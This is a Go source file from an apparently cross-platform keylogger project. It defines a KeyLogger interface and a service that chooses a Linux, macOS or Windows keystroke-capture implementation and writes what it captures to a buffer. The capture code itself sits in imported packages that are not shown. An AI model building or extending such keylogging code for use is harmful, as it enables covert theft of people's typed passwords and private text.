package keys

import (
	"bytes"

	"github.com/adelapazborrero/logger/os-utils/linux"
	"github.com/adelapazborrero/logger/os-utils/mac"
	"github.com/adelapazborrero/logger/os-utils/windows"
)

type KeyLogger interface {
	CaptureKeyboardKeys(logBuffer *bytes.Buffer)
}

type KeyLoggerService struct {
	OS            string
	currentLogger KeyLogger
}

func NewKeyLoggerService(os string) *KeyLoggerService {
	return &KeyLoggerService{
		OS: os,
	}
}

func (s *KeyLoggerService) InitLogger() {
	switch s.OS {
	case "linux":
		s.currentLogger = linux.NewLinuxLogger()
	case "darwin":
		s.currentLogger = mac.NewMacLogger()
	case "windows":
		s.currentLogger = windows.NewWindowsLogger()
	default:
		s.currentLogger = nil
	}
}

func (s *KeyLoggerService) CaptureKeys(logBuffer *bytes.Buffer) {
	if s.currentLogger == nil {
		logBuffer.WriteString("OS not supported")
		return
	}
	s.currentLogger.CaptureKeyboardKeys(logBuffer)
}
